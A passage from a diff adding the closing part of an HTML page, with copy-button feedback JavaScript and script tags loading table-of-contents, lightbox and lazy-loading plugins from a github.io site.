+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>
+
+</html>
